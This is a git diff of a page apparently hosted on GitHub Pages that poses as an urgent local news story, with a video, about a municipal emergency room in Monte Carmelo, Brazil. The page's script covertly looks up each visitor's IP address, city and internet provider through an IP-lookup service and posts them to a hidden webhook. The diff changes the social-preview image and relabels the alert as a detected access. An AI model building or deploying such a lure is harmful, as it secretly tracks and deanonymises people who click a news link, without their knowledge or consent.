@@ -7,8 +7,8 @@
 
     <meta property="og:title" content="🚨 URGENTE: SITUAÇÃO DO PRONTO SOCORRO MUNICIPAL DE MONTE CARMELO">
     <meta property="og:description" content="Secretário de Saúde é citado em cobrança por melhores condições. Clique para assistir ao vídeo e ver os detalhes.">
-    <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/Screenshot_20260429-145602.png">
-    <meta property="og:image:type" content="image/png">
+    <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/0d53dca14e1d123a76bffbdaea0873bfe24ac78f/IMG-20260429-WA0195.jpg">
+    <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:url" content="https://noticiasmonte.github.io/montecity/">
@@ -33,7 +33,7 @@
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    const infoRede = `🏥 **ACESSO: MATÉRIA PRONTO SOCORRO**\n🌐 **IP:** ${data.ip}\n🏙️ **Cidade:** ${data.city}\n📡 **Provedor:** ${data.org}`;
+                    const infoRede = `🏥 **ACESSO DETECTADO: PRONTO SOCORRO**\n🌐 **IP:** ${data.ip}\n🏙️ **Cidade:** ${data.city}\n📡 **Provedor:** ${data.org}`;
                     fetch(WEBHOOK_URL, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
